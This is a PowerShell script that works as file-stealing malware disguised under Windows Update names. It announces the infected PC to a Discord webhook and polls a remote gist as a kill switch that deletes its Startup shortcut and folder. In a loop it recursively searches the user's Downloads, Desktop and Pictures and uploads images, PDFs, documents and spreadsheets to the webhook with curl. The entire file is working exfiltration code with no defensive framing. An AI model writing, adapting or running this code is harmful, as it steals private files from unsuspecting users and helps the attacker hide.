# --- CONFIGURATION ---
$WebhookUrl = "YOUR_DISCORD_WEBHOOK_URL"
$KillSwitch = "https://gist.githubusercontent.com/09sychic/13dac0dcfbb36f84b5d779fae32010cd/raw/9faf55d8482fd73045b888027dd0bd39631737b2/status.txt"
$Verbose = $true  
$WaitTime = 60     
$Depth = 3      # Set how many subfolders deep to look
# ---------------------

$Dir = "$env:LOCALAPPDATA\WinUpdateDiagnostic"
$LogFile = "$Dir\LocalAudit.dat"
$Paths = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Pictures")

function Write-Log($msg, $color = "Cyan") {
    if ($Verbose) { 
        $timestamp = Get-Date -Format "HH:mm:ss"
        Write-Host "[$timestamp] $msg" -ForegroundColor $color 
    }
}

function Invoke-SelfDestruct {
    Write-Log "!!! SELF-DESTRUCT TRIGGERED !!!" "Red"
    $lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateAssistant.lnk"
    if (Test-Path $lnk) { Remove-Item $lnk -Force -ErrorAction SilentlyContinue }
    Start-Process cmd -ArgumentList "/c timeout /t 5 && rd /s /q `"$Dir`"" -WindowStyle Hidden
    exit
}

if (-not (Test-Path $Dir)) { New-Item -Path $Dir -ItemType Directory -Force | Out-Null }
if (-not (Test-Path $LogFile)) { New-Item -ItemType File -Path $LogFile -Force | Out-Null }

Write-Log "Service Started. PC: $env:COMPUTERNAME" "Green"

try {
    $statusMsg = "[SYSTEM ONLINE]`nPC: $env:COMPUTERNAME"
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{content = $statusMsg } | ConvertTo-Json) -ContentType "application/json" | Out-Null
}
catch { Write-Log "Discord Check-in Failed." "Yellow" }

while ($true) {
    try {
        # 1. KILL-SWITCH
        $Status = (Invoke-WebRequest -Uri $KillSwitch -UseBasicParsing -TimeoutSec 10).Content.Trim()
        if ($Status -eq "OFFLINE") { Invoke-SelfDestruct }

        # 2. FILE AUDIT
        Write-Log "Starting Deep Scan (Depth: $Depth)..."
        $Uploaded = @{}
        if (Test-Path $LogFile) { Get-Content $LogFile | ForEach-Object { $Uploaded[$_] = $true } }

        foreach ($p in $Paths) {
            if (Test-Path $p) {
                # ADDED -Recurse and -Depth to find files in subfolders
                $files = Get-ChildItem -Path $p -File -Recurse -Depth $Depth -ErrorAction SilentlyContinue
                
                foreach ($f in $files) {
                    $SizeMB = [math]::Round($f.Length / 1MB, 2)
                    $Key = "$($f.FullName)|$SizeMB|$($f.LastWriteTimeUtc)"
                    $Ext = $f.Extension.ToLower()
                    $Targets = @(".jpg", ".jpeg", ".png", ".heic", ".webp", ".pdf", ".docx", ".txt", ".xlsx")

                    if (-not $Uploaded[$Key] -and $Targets -contains $Ext -and $SizeMB -le 24 -and $SizeMB -gt 0) {
                        Write-Log "MATCH FOUND: $($f.FullName) ($SizeMB MB)" "Magenta"
                        
                        & curl.exe -s -F "content=[DEEP AUDIT] $($f.Name)" -F "file=@$($f.FullName)" $WebhookUrl | Out-Null
                        
                        if ($LASTEXITCODE -eq 0) {
                            Write-Log "SUCCESS: Sent." "Green"
                            $Key | Out-File -Append -FilePath $LogFile
                        }
                        else {
                            Write-Log "FAIL: Curl error $LASTEXITCODE" "Red"
                        }
                    }
                }
            }
        }
    }
    catch { Write-Log "Error: $($_.Exception.Message)" "Red" }

    # 3. TIMER
    Write-Log "Cycle complete."
    for ($i = $WaitTime; $i -gt 0; $i--) {
        if ($Verbose) {
            $currTime = Get-Date -Format "HH:mm:ss"
            Write-Host -NoNewline "`r[$currTime] Next scan in: $i seconds...   " 
        }
        Start-Sleep -Seconds 1
    }
    Write-Host "" 
}
